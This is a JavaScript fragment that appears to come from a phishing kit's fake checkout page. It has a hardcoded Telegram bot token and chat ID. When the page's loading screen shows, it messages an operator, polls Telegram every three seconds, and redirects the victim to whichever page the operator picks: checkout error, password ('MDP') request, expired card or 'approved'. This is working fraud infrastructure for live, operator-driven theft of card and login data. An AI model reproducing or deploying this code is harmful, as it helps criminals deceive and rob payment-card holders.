        const token = "7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8";
        const chatId = "6669693805";
        const psd = "Console By YKK";

        function sendInlineKeyboard() {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const messageData = {
                chat_id: chatId,
                text: `🔵 ${psd}`,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "CheckoutError", callback_data: "v:" + psd }],
                        [{ text: "Checkout", callback_data: "e:" + psd }],
                        [{ text: "2-Checkout MDP", callback_data: "o2:" + psd }],
                        [{ text: "Checkout EXPIRE", callback_data: "o1:" + psd }],
                        [{ text: "Approved ", callback_data: "o10:" + psd }]
                    ]
                }
            };

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(messageData)
            }).catch(console.error);
        }

        function getUpdates() {
            const url = `https://api.telegram.org/bot${token}/getUpdates`;
            fetch(url)
                .then(res => res.json())
                .then(data => {
                    const updates = data.result;
                    if (!updates.length) return;

                    updates.forEach(update => {
                        const query = update.callback_query;
                        if (!query) return;

                        const [type, value] = query.data.split(":");
                        if (value === psd) {
                            const redirections = {
                                v: "CheckoutError.html",
                                e: "Checkout.html",
                                o2: "CheckoutMDP.html",
                                o1: "CheckoutExpire.html",
                                o10: "CheckoutValide.html"
                            };

                            if (redirections[type]) {
                                window.location.href = redirections[type];
                            }

                            markUpdateAsRead(update.update_id);
                        }
                    });
                })
                .catch(console.error);
        }

        function markUpdateAsRead(updateId) {
            const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${updateId + 1}`;
            fetch(url).catch(console.error);
        }

        document.addEventListener("DOMContentLoaded", () => {
            const loadingScreen = document.getElementById("loading-screen");

            const observer = new MutationObserver(() => {
                if (loadingScreen.style.display === "flex") {
                    sendInlineKeyboard();
                    setInterval(getUpdates, 3000);
                }
            });

            observer.observe(loadingScreen, { attributes: true, attributeFilter: ['style'] });
        });
